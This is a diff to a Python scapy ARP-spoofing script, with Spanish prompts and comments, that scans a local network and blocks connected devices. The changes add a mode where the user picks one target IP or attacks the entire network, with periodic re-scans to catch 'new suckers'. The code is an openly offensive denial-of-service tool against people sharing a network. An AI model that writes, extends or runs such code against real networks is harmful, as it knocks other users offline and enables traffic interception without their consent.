@@ -1,3 +1,5 @@
+#VIPREDARP
+
 from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr, conf, IFACES
 import time
 import sys
@@ -238,10 +240,34 @@ def main():
         sys.exit(1)
     print(f"[+] MAC Gateway : {mac_gateway}\n")
 
-    dispositivos = escanear_red(rango, interfaz, mi_ip, gateway)
+    dispositivos_encontrados = escanear_red(rango, interfaz, mi_ip, gateway)
+
+    print("\n" + "="*55)
+    print(" [?] MODO DE ATAQUE")
+    print("     Presiona ENTER para atacar a TODA LA RED.")
+    print("     O escribe una IP específica (Ej: 192.168.1.15).")
+    print("="*55)
+    objetivo_ip = input("\n[>] Tu elección: ").strip()
+
+    if objetivo_ip:
+        dispositivos = [d for d in dispositivos_encontrados if d["ip"] == objetivo_ip]
+        if not dispositivos:
+            print(f"[*] La IP {objetivo_ip} no estaba en el escaneo, buscando directamente...")
+            mac_obj = obtener_mac(objetivo_ip, interfaz)
+            if mac_obj:
+                dispositivos = [{"ip": objetivo_ip, "mac": mac_obj}]
+                print(f"    [+] ¡Encontrado! {objetivo_ip} | {mac_obj}")
+            else:
+                print(f"[!] No se pudo encontrar la IP {objetivo_ip}. Saliendo...")
+                sys.exit(1)
+        else:
+            print(f"[+] Atacando unicamente a la IP: {objetivo_ip}")
+    else:
+        dispositivos = dispositivos_encontrados
+        print("[+] Modo Masivo: Atacando a TODA LA RED.")
 
     if not dispositivos:
-        print("[!] No se encontraron otros dispositivos en la red.")
+        print("[!] No se encontraron otros dispositivos en la red para atacar.")
         sys.exit(0)
 
     print(f"\n[!] {len(dispositivos)} dispositivo(s) a bloquear")
@@ -250,7 +276,8 @@ def main():
     ciclos = 0
     try:
         while True:
-            if ciclos % 30 == 0 and ciclos != 0:
+            # Si el modo es masivo (sin IP específica), seguimos escaneando buscando nuevos incautos
+            if not objetivo_ip and ciclos % 30 == 0 and ciclos != 0:
                 print("\n[*] Re-escaneando...")
                 nuevos = escanear_red(rango, interfaz, mi_ip, gateway)
                 ips_actuales = {d["ip"] for d in dispositivos}
